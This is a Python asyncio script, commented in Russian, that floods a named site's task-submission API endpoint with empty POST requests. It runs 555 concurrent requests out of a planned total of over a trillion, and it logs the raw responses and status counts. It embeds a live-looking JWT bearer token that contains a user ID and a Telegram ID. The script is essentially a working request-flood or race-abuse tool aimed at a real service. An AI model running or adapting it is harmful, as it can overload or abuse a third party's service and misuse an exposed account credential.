import asyncio
import aiohttp
from collections import defaultdict
import sys
import json

# ------------------- Настройки -------------------
CONCURRENT_REQUESTS = 555
TOTAL_REQUESTS = 1111111111111              # для теста
REQUEST_TIMEOUT = 1
LOG_FIRST_RESPONSES = 50           # сколько первых ответов логировать полностью (и успешных, и ошибок)
LOG_FULL_RESPONSE = True          # выводить заголовки и тело
# ------------------------------------------------

TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjMyMzk0OCwidGVsZWdyYW1JZCI6NjMyNTAzNzMyLCJyb2xlIjoidXNlciIsImlhdCI6MTc3NjYzNjM1MiwiZXhwIjoxNzc2NzIyNzUyfQ.oWhXOZxi-WhES7gAtMEeXrAHkl2AnJUyoHER89TZw1o"
TASK_ID = 342
BASE_URL = "https://maloycser.com"
URL = f"{BASE_URL}/api/tasks/{TASK_ID}/submit"

HEADERS = {
    "Accept": "*/*",
    "Accept-Language": "ru,en;q=0.9",
    "Authorization": f"Bearer {TOKEN}",
    "Origin": BASE_URL,
    "Referer": f"{BASE_URL}/tasks",
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json",
}

PAYLOAD = {}

success_count = 0
error_count = 0
status_counter = defaultdict(int)
raw_responses = []      # храним сырые данные первых ответов
lock = asyncio.Lock()
responses_logged = 0
start_time = None
total_sent = 0

async def post_request(session: aiohttp.ClientSession, semaphore: asyncio.Semaphore):
    global success_count, error_count, responses_logged, total_sent
    async with semaphore:
        try:
            async with session.post(URL, json=PAYLOAD, headers=HEADERS, timeout=REQUEST_TIMEOUT) as resp:
                status = resp.status
                headers = dict(resp.headers)  # заголовки ответа
                text = await resp.text()
                
                async with lock:
                    total_sent += 1
                    status_counter[status] += 1
                    if status == 200:
                        success_count += 1
                    else:
                        error_count += 1
                    
                    # Логируем сырой ответ для первых N запросов
                    if responses_logged < LOG_FIRST_RESPONSES:
                        responses_logged += 1
                        raw_responses.append({
                            "status": status,
                            "headers": headers,
                            "body": text,          # полное тело
                        })
                        # Сразу печатаем в консоль
                        print(f"\n📨 СЫРОЙ ОТВЕТ #{responses_logged} (статус {status})")
                        print("--- Заголовки ---")
                        for k, v in headers.items():
                            print(f"  {k}: {v}")
                        print("--- Тело ---")
                        print(text)
                        print("-" * 40)
                        sys.stdout.flush()
        except asyncio.TimeoutError:
            async with lock:
                error_count += 1
                total_sent += 1
                status_counter["timeout"] += 1
                if responses_logged < LOG_FIRST_RESPONSES:
                    responses_logged += 1
                    raw_responses.append({"status": "timeout", "body": f"Таймаут {REQUEST_TIMEOUT}с"})
                    print(f"\n⏰ ТАЙМАУТ #{responses_logged}")
        except Exception as e:
            async with lock:
                error_count += 1
                total_sent += 1
                status_counter["exception"] += 1
                if responses_logged < LOG_FIRST_RESPONSES:
                    responses_logged += 1
                    raw_responses.append({"status": "exception", "body": str(e)})
                    print(f"\n💥 ИСКЛЮЧЕНИЕ #{responses_logged}: {e}")

async def progress_reporter(total: int, interval: float = 2.0):
    while True:
        await asyncio.sleep(interval)
        current = success_count + error_count
        if current >= total:
            break
        elapsed = asyncio.get_event_loop().time() - start_time
        rate = current / elapsed if elapsed > 0 else 0
        print(f"📊 {current}/{total} | ✅ {success_count} | ❌ {error_count} | {rate:.1f} з/с")
        sys.stdout.flush()

async def main():
    global start_time
    start_time = asyncio.get_event_loop().time()
    
    print(f"🚀 Отправка {TOTAL_REQUESTS} запросов к {URL}")
    print(f"⚙️  CONCURRENT: {CONCURRENT_REQUESTS} | Таймаут: {REQUEST_TIMEOUT}с")
    print(f"🔑 Токен: {TOKEN[:20]}...{TOKEN[-10:]}")
    sys.stdout.flush()

    semaphore = asyncio.Semaphore(CONCURRENT_REQUESTS)
    connector = aiohttp.TCPConnector(limit=CONCURRENT_REQUESTS + 10, force_close=True)

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(post_request(session, semaphore)) for _ in range(TOTAL_REQUESTS)]
        reporter = asyncio.create_task(progress_reporter(TOTAL_REQUESTS))
        await asyncio.gather(*tasks)
        reporter.cancel()

    print("\n" + "=" * 60)
    print(f"✅ Успешно (200):        {success_count}")
    print(f"❌ Всего ошибок:         {error_count}")
    print("\n📋 Распределение по статусам:")
    for code, cnt in sorted(status_counter.items(), key=lambda x: -x[1]):
        print(f"   {code}: {cnt}")
    print("=" * 60)
    sys.stdout.flush()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⏹️  Прервано пользователем")
